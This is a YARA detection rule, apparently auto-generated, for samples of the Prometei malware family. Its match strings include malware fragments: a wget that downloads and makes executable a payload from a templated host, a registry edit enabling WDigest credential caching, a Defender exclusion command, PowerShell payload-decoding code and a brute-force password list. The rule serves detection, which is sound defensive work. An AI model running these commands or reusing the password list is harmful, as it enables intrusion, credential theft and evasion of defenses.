rule Sightlines_imphash_533bfee1_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-533bfee1"
        date = "2026-11-01"
        campaign = "imphash-533bfee1"
        family = "prometei"
        hash = "260f74d23b51205505f5782e1893d2f16055fb9daab8430920718851127bd17f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-533bfee1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "powershell $f='%s;$o='%s';$data=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($f)" ascii
        $s1 = ":Option Name=\"WINRS_SKIP_CMD_SHELL\">FALSE</w:Option></w:OptionSet></env:Header><env:Body><rsp:Comman" ascii
        $s2 = "/C reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLog" ascii
        $s3 = "+SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4" wide
        $s4 = "prometeicmd \"wget http://%s/k.php?a=x86_64,%sD -O upnpsetup&&chmod 777 ./upnpsetup\"" ascii
        $s5 = "</w:Selector></w:SelectorSet><w:OptionSet><w:Option Name=\"WINRS_CONSOLEMODE_STDIN\">TRUE</w:Option><w" ascii
        $s6 = ");[io.file]::WriteAllBytes($o,$data);Remove-Item $f;Write-Host (Get-Item $o).length;" ascii
        $s7 = "Content-Type: multipart/encrypted;protocol=\"application/HTTP-SPNEGO-session-encrypted\";boundary=\"Enc" ascii
        $s8 = "d Add-MpPreference -ExclusionPath \"C:\\Windows\\Dell\"" ascii
        $s9 = "|sql2005|abc|abcdefg|Aa12345678|ABCabc123|sqlpassword|sql2008|qwe1234|Lab|servidor@2024|Servidor@202" ascii
        $s10 = "OriginalContent: type=application/soap+xml;charset=UTF-8;Length=" ascii
        $s11 = "Content-Type: application/soap+xml;charset=UTF-8" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}
